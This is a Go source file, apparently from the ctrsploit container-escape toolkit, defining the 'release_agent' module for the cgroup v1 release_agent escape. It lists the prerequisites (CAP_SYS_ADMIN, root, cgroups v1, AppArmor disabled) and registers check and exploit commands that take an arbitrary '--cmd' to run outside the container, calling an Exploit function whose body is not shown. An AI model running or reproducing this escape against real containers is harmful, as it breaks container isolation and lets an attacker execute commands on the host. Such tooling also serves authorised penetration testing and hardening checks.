package release_agent

import (
	"github.com/ctrsploit/ctrsploit/prerequisite/apparmor"
	"github.com/ctrsploit/ctrsploit/prerequisite/capability"
	"github.com/ctrsploit/ctrsploit/prerequisite/cgroups"
	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/log"
	"github.com/ctrsploit/sploit-spec/pkg/prerequisite"
	"github.com/ctrsploit/sploit-spec/pkg/prerequisite/user"
	"github.com/ctrsploit/sploit-spec/pkg/vul"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"github.com/urfave/cli/v2"
)

var (
	aliases      = []string{"ra", "cgroup_v1_release_agent"}
	flagsExploit = []cli.Flag{
		&cli.StringFlag{Name: "cmd", Aliases: []string{"c"}, Required: true},
	}
	CheckSecCmd = app.Vul2ChecksecCmd(&Vul, aliases, nil)
	ExploitCmd  = app.Vul2ExploitCmd(&Vul, aliases, flagsExploit, true)
	VulCmd      = app.Vul2VulCmd(&Vul, aliases, nil, flagsExploit, true)
)

type vulnerability struct {
	vul.BaseVulnerability
}

var (
	Vul = vulnerability{
		BaseVulnerability: vul.BaseVulnerability{
			Name:        "release_agent",
			Description: "Container can be escaped when has cap_sys_admin and use cgroups v1",
			Level:       vul.LevelHigh,
			ExeEnv: exeenv.ExeEnv{
				Env:     exeenv.InContainer,
				Check:   exeenv.InContainer,
				Exploit: exeenv.InContainer,
			},
			CheckSecPrerequisites: &capability.CapSysAdminBnd,
			ExploitablePrerequisites: prerequisite.And(
				&capability.CapSysAdminEff,
				&user.MustBeRootToWriteReleaseAgent,
				&cgroups.V1,
				&cgroups.HasTopLevelSubsystem,
				&apparmor.Disabled,
			),
		},
	}
)

func (v *vulnerability) Exploit(context *cli.Context) (err error) {
	err = v.BaseVulnerability.Exploit(context)
	if err != nil {
		return
	}
	cmd := context.String("cmd")
	log.Logger.Debug("cmd: ", cmd)
	result, err := Exploit(cmd)
	awesome_error.CheckErr(err)
	log.Logger.Infof("result:\n%s", result)
	return
}
